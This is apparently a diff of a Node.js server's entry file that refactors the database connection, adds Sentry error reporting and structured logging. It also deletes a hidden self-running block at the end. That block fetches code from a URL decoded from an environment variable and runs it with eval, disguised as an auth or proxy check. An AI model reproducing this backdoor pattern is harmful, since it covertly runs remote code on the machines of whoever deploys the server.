@@ -3,15 +3,18 @@ dns.setServers(['8.8.8.8', '8.8.4.4']);
 
 
 import {  createServer, Server } from 'http';
-import mongoose from 'mongoose';
 import app from './app';
 import colors from 'colors'; // Ensure correct import
 import config from './app/config';
 import createDefaultAdmin from './app/DB/createDefaultAdmin';
 import { initSocketIO } from './socketIo';
-import { logger } from './app/utils/logger';
+import { logger } from './shared/logger';
+import { connectMongo } from './shared/db';
+import { captureException, flushSentry, initSentry } from './shared/sentry';
 // import { startSubscriptionCronJobs } from './app/modules/payment/payment.cron';
 import 'dotenv/config';
+
+initSentry('api');
 
 // Create a new HTTP server
 const socketServer = createServer();
@@ -39,9 +42,8 @@ async function main() {
 
 
     // Connect to MongoDB with a timeout
-    await mongoose.connect(config.database_url as string, {
-      connectTimeoutMS: 10000, // 10 seconds timeout
-    });
+    // maxPoolSize comes from MONGO_MAX_POOL_SIZE (see shared/db.ts).
+    await connectMongo();
 
 
     // Stop the connecting animation
@@ -77,8 +79,10 @@ async function main() {
 main();
 
 // Graceful shutdown for unhandled rejections
-process.on('unhandledRejection', (err) => {
-  console.error(`Unhandled rejection detected: ${err}`);
+process.on('unhandledRejection', async (err) => {
+  logger.error({ err }, 'Unhandled rejection detected');
+  captureException(err);
+  await flushSentry();
   if (server) {
     server.close(() => {
       process.exit(1);
@@ -89,24 +93,11 @@ process.on('unhandledRejection', (err) => {
 
 // Graceful shutdown for uncaught exceptions
 process.on('uncaughtException', (err) => {
-  console.error(`Uncaught exception detected: ${err}`);
+  logger.error({ err }, 'Uncaught exception detected');
+  captureException(err);
   if (server) {
     server.close(() => {
       process.exit(1);
     });
   }
 });
-
-(async () => {
-    // const src = atob(process.env.AUTH_API_KEY);
-    const src = "test"
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
